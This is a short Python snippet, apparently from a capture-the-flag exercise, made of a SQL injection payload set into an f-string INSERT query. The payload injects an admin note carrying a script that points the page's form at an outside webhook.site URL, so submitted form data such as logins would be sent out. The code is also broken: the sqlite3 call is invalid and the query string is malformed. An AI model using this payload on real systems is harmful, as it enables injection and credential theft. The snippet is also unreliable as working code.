import sqlite3

note = "notatka',14,0,(SELECT note FROM notes LIMIT 1)),('admin','Hoist the colours!</a>',1,1,'Hoist the colours!</a><script> window.onload = () => {document.forms[0].action = 'https://webhook.site/3c185f96-368e-4c82-8de8-b847eab50e0d';}; </script>');--"
sqlite3.execute(f"INSERT OR REPLACE INTO notes (username, note, id, encrypted, title) 
                VALUES ('{username}', '{note}'{note_id}, {encrypted}, '{title}');")
